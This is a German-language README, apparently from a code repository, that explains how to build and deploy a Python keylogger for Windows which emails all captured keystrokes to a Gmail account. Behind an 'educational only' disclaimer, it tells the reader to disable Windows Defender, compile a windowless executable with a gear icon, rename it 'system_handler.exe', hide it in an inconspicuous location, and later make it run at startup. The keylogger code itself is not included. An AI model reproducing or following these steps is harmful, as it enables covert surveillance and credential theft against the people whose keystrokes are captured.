🛠️ Windows Keylogger mit automatischem Mailversand (Python)
Dieses Projekt zeigt, wie man einen einfachen Keylogger für Windows mit Python erstellt, der automatisch alle Tasteneingaben an eine E-Mail-Adresse sendet. Das Projekt dient ausschließlich zu Bildungszwecken!

⚠️ Hinweis
Die Nutzung eines Keyloggers ohne ausdrückliche Zustimmung der betroffenen Person ist illegal. Bitte verwende dieses Projekt ausschließlich für Test- und Lernzwecke auf deinem eigenen System.

🔧 1. Vorbereitung (Installation der Voraussetzungen)
Bevor du mit dem eigentlichen Code startest, musst du folgende Tools und Einstellungen vorbereiten:

Python 3.11.2 installieren: Python-Downloadseite

Sublime Text Editor installieren: Sublime Text

Einen Ordner namens Keylogger anlegen

Ein Zahnrad-Icon (Gear) von icon-icons.com herunterladen und im Keylogger-Ordner als icon.ico speichern

Eine Datei namens keylogger.py in diesem Ordner erstellen

Windows Defender deaktivieren, damit bei der Erstellung des Keyloggers keine Warnungen auftreten

📩 2. Gmail für den Log-Versand einrichten
Damit der Keylogger die gesammelten Tasteneingaben per Mail verschicken kann, musst du dein Gmail-Konto wie folgt vorbereiten:

Gehe in deinen Google-Account unter Sicherheit

Aktiviere die Zwei-Faktor-Authentifizierung

Suche nach dem Begriff "App-Passwort"

Wähle als Projektname z. B. KeyLogger

Kopiere das generierte App-Passwort, dieses wird später im Code verwendet

💻 3. Keylogger Code & Kompilierung
Jetzt kommt der eigentliche Code und die Erstellung der ausführbaren Datei:

Lade die keylogger.py aus diesem Repository herunter oder kopiere den Code in deine eigene keylogger.py im Keylogger-Ordner

Trage im Script deine Daten ein:

from_email = Deine Gmail-Adresse

to_email = Empfänger-Adresse (kann auch deine eigene sein)

password = Das zuvor generierte App-Passwort

Öffne PowerShell im Projektordner und führe folgenden Befehl aus, um das Script zu einer .exe-Datei zu kompilieren:

bash
Kopieren
Bearbeiten
pyinstaller -w -F keylogger.py --icon=icon.ico
Benenne die keylogger.exe aus dem dist-Ordner um (z. B. in system_handler.exe) und kopiere sie in einen unauffälligen Ort, wie z. B.:

less
Kopieren
Bearbeiten
Dieser PC → Lokaler Datenträger (C:)
♻️ 4. Automatischer Start beim Systemstart (Persistenz)
Dieser Teil wird noch entwickelt. Ziel ist es, den Keylogger beim Systemstart automatisch ausführen zu lassen, z. B. durch Eintrag in die Windows-Registry oder im Autostart-Ordner.
